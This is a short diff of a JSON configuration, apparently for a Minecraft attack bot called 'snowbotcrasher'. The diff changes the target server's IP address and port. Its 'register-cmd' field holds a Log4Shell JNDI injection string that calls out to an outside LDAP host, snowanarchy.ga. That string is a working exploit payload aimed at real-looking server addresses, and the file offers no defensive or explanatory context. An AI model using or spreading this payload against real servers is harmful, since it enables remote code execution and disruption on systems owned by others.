@@ -1,7 +1,7 @@
 {
-	"ip":"185.116.158.145",
-	"port": 58605,
-	"name": "snowbotcrasher",
+	"ip":"37.187.24.31",
+	"port": 25605,
+ 	"name": "snowbotcrasher",
 	"auto-night-skip":"false",
 	"login-enabled":"true",
 	"register-cmd":"/${jndi:ldap://snowanarchy.ga:9313/test}",
